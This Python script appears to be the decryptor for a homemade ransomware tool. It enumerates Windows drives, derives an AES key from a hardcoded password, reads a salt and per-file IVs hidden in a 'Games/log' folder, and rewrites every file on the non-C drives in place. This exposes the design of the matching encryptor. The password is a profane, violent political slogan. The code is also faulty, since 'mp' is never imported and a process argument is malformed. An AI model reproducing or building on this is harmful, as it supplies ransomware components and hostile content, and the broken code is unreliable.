import os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt
from Crypto.Util.Padding import unpad
import base64

# Getting windows hard drives
drives = []
def windows_drive_letter():
    for i in range(65,91): #65->A and 91->Z in Ascii
        drive = chr(i) + ':'
        if os.path.exists(drive):
            drives.append(drive)
# Configuration
PASSWORD = "Death_to_the_fucking_awamis"  # Same password used for encryption
IV_PATH = f"C:/Users/{os.getlogin()}/Documents/Games/log/.ivs/"  # Directory where IVs are stored

# Vai directly SALT ta read kore ekhane boshaileo hoy but jehetu akta bin file ase tai eta jaite pare
with open("C:/Users/" + os.getlogin() +"/Documents/Games/log/.salt/salt.bin", 'rb') as salt_file:
    SALT = salt_file.read()

# Key derivation
key = scrypt(PASSWORD.encode(), SALT, 32, N=2**14, r=8, p=1)  # AES-256 key

def decrypt_file(file_path):
    iv_path = os.path.join(IV_PATH, os.path.basename(file_path) + '.iv')
    
    # Read the IV
    with open(iv_path, 'rb') as f:
        iv = f.read()
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    
    # Decrypt the data
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    
    # Write the decrypted data back to the original file
    with open(file_path, 'wb') as f:
        f.write(decrypted_data)
    
    print(f'Decrypted: {file_path}')

def decrypt_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path)

# Decrypt the specified directory
if __name__ == '__main__':
    try:
        windows_drive_letter()
        for i in drives:
            if i == 'C:':
                continue
            else:
                mp.Process(target=decrypt_directory, args=(i+'/')).start()
    except:
        print('LOL_ERROR_OCCURED :(')
